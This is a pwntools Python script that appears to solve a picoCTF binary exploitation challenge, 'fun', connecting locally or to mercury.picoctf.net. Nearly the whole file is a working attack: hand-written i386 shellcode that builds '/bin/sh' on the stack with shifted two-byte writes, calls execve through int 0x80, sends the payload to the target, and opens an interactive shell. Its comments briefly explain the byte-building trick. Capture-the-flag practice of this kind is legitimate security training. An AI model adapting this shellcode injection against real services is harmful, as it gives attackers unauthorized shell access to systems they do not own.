#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

context.binary = './fun'

BINARY = './fun' 
HOST = 'mercury.picoctf.net'
PORT = 37853 

def get_connection(mode):
    """Get connection based on mode (local/remote)"""
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Mode must be 'local' or 'remote'")
        exit(1)

def exploit(conn):
    context.arch = 'i386'


    # code explanation time
    # origianlly i tried building with eax for some reason

    #we just shift 0x68 from all the way to the right [upper ebx][bh][bl] such that bl -> [bl upper ebx][bh][bl]

    code = '''
        xor eax, eax
        mov al, 0xb
        xor ecx, ecx
        xor edx, edx

        xor ebx, ebx
        mov bl, 0x68
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        mov bh, 0x73
        mov bl, 0x2f
        push ebx
        nop


        mov bh, 0x6e
        mov bl, 0x69
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        shl ebx
        mov bh, 0x62
        mov bl, 0x2f


        push ebx
        nop
        mov ebx, esp
        int 0x80
    '''

    shellcode = asm(code)


    conn.recv()
    conn.send(shellcode)
    conn.interactive()



def main():
    import sys
    
    if len(sys.argv) != 2:
        log.error("Usage: python exploit.py [local|remote]")
        exit(1)
    info
    mode = sys.argv[1]
    
    # Get connection
    conn = get_connection(mode)
    
    # Run exploit
    exploit(conn)
    
    # Clean up
    conn.close()

if __name__ == "__main__":
    main()